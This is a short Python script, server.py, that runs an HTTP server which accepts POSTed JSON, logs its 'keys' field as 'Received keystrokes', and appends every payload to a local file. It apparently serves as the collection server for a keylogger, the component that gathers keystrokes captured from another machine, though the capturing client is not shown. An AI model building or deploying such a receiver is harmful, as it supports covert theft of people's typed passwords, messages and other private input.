# server.py - Simple log receiver
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class LogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            logging.info(f"Received keystrokes: {data.get('keys', '')}")
            
            # Save to file
            with open('received_logs.txt', 'a') as f:
                f.write(f"{data}\n")
            
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            logging.error(f"Error: {e}")
            self.send_response(500)
            self.end_headers()

def run_server(port=8080):
    server = HTTPServer(('localhost', port), LogHandler)
    print(f"[*] Log server running on http://localhost:{port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()